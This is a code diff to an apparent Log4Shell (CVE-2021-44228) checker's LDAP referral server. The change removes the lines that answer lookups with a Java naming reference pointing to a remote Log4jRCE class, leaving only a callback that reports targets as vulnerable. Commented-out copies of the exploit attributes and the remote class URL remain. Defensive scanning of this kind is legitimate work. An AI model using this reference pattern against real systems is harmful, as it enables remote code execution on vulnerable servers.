@@ -133,7 +133,6 @@ public class LDAPRefServer {
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
             
             URL turl = new URL("https://threats.kapa7.com/assets/Log4jRCE.class");
-            URL rceurl = new URL("https://threats.kapa7.com/assets/#Log4jRCE");
 
             //Hacer peticion a API de Threats para notificar que es vulnerable
             URL url = new URL ("https://api.threats.kapa7.com/api/CVEChecks/cve_2021_44228");
@@ -171,15 +170,10 @@ public class LDAPRefServer {
             }
 
             System.out.println("Send LDAP reference result for token " + base + ", redirecting to " + turl);
-            e.addAttribute("javaClassName", "Log4jRCE");
-            String cbstring = rceurl.toString();
-            int refPos = cbstring.indexOf('#');
-            if ( refPos > 0 ) {
-                cbstring = cbstring.substring(0, refPos);
-            }
-            e.addAttribute("javaCodeBase", cbstring);
-            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
-            e.addAttribute("javaFactory", rceurl.getRef());
+            // e.addAttribute("javaClassName", "foo");
+            // e.addAttribute("javaCodeBase", "https://threats.kapa7.com/assets/");
+            // e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+            // e.addAttribute("javaFactory", "Log4jRCE");
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         }
